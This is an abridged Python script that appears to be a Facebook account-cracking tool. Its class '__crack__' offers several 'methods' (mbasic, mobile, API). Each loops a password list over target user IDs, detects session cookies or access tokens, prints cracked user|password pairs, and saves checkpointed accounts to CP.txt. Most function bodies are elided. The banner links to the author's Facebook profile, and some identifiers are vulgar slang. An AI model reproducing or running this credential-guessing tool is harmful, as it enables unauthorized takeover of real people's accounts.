...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							ALEENA('[•] Result CP saved to CP.txt')
					...
					ALEENA('02.) Metode mbasic ')

					ALEENA('03.) Metode Mobile ')
			...
			ALEENA(' [1] ALEENO Method 1 ')

			ALEENA(' [2] ALEENO Method 2  [ Pro ]')

			ALEENA(' [3] ALEENO Method 3   ')
	...
	def __api__(self, user, _sempak_):
		...
		sys.stdout.write('\r\033[1;97m [ALEENA] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				...
				try:
					...
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-ALEENA] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
				...
				IMTIAZ_AKING('\r\033[1;91m[CHECKPOINT-ALEENA] %s | %s%s      '%(user,pw,tahun(user)))
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				IMTIAZ_AKING('\r\033[1;32m[Successful-ALEENA] %s | %s      ' % (user,pw))
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				IMTIAZ_AKING('\r\033[1;92m[Successful-ALEENA] %s | %s      '%(user,pw))
...
(__)(__)(____)(____)(____)(_)\_)(__)(__)
 ...
 [*]=============================================
    ...
    Facebook : https://www.facebook.com/profile.php?id=100069979303159
